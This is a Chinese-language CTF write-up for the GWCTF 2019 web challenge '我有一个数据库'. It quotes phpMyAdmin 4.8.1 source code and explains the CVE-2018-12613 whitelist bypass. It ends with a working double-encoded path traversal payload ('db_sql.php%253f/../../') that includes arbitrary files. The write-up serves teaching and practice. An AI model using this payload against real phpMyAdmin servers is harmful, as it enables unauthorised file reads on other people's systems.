# GWCTF 2019

## Web

### 我有一个数据库

#### **目录搜索**

根据 dirsearch 可以得到 `/robots.txt、/phpmyadmin/index.php、/phpinfo.php、/phpmyadmin/ChangeLog、/phpmyadmin/README、/phpmyadmin/doc/html/index.html、/javascript、/index.html` 均为可访问文件。

#### **phpmyadmin 漏洞**

登录进入 phpmyadmin 可以发现可以直接进入，登录的账号为 test ，版本为 4.8.1，根据百度查找可以发现该版本存在漏洞（CVE-2018-12613），该漏洞没有严格的进行过滤。

#### **漏洞内容**

```php
$target_blacklist = array (
    'import.php', 'export.php'
);

// If we have a valid target, let's load that script instead
if (! empty($_REQUEST['target']) // target 不能为空
    && is_string($_REQUEST['target']) // target 必须为字符串
    && ! preg_match('/^index/', $_REQUEST['target']) // target 不能包含 index
    && ! in_array($_REQUEST['target'], $target_blacklist) // target 不能在黑名单内
    && Core::checkPageValidity($_REQUEST['target']) // checkPageValidity 为真
) {
    include $_REQUEST['target'];
    exit;
}
```

checkPageValidity 函数内容如下

```php
public static function checkPageValidity(&$page, array $whitelist = [])
{
    if (empty($whitelist)) {
        $whitelist = self::$goto_whitelist;
    }
    if (! isset($page) || !is_string($page)) {
        return false;
    }

    if (in_array($page, $whitelist)) {
        return true;
    }

    $_page = mb_substr(
        $page,
        0,
        mb_strpos($page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }

    $_page = urldecode($page);
    $_page = mb_substr(
        $_page,
        0,
        mb_strpos($_page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }

    return false;
}
```

$goto\_whitelist 变量内容如下

```php
public static $goto_whitelist = array(
'db_datadict.php',
'db_sql.php',
'db_events.php',
'db_export.php',
'db_importdocsql.php',
'db_multi_table_query.php',
'db_structure.php',
'db_import.php',
'db_operations.php',
'db_search.php',
'db_routines.php',
'export.php',
'import.php',
'index.php',
'pdf_pages.php',
'pdf_schema.php',
'server_binlog.php',
'server_collations.php',
'server_databases.php',
'server_engines.php',
'server_export.php',
'server_import.php',
'server_privileges.php',
'server_sql.php',
'server_status.php',
'server_status_advisor.php',
'server_status_monitor.php',
'server_status_queries.php',
'server_status_variables.php',
'server_variables.php',
'sql.php',
'tbl_addfield.php',
'tbl_change.php',
'tbl_create.php',
'tbl_import.php',
'tbl_indexes.php',
'tbl_sql.php',
'tbl_export.php',
'tbl_operations.php',
'tbl_structure.php',
'tbl_relation.php',
'tbl_replace.php',
'tbl_row_action.php',
'tbl_select.php',
'tbl_zoom_select.php',
'transformation_overview.php',
'transformation_wrapper.php',
'user_password.php',
);
```

#### **信息获取**

获取数据库所在路径

```sql
show global variables like "%datadir%";
```

#### **获取 Flag**

因为 checkPageValidity() 函数进行了一次 urldecode() 函数进行转义，但是并没有多次进行过滤，因此可以它通过两次对 ? 进行编码为 %253f 后即可进行绕过

构造 payload `target=db_sql.php%253f/../../../../../../flag` 即可获得 flag
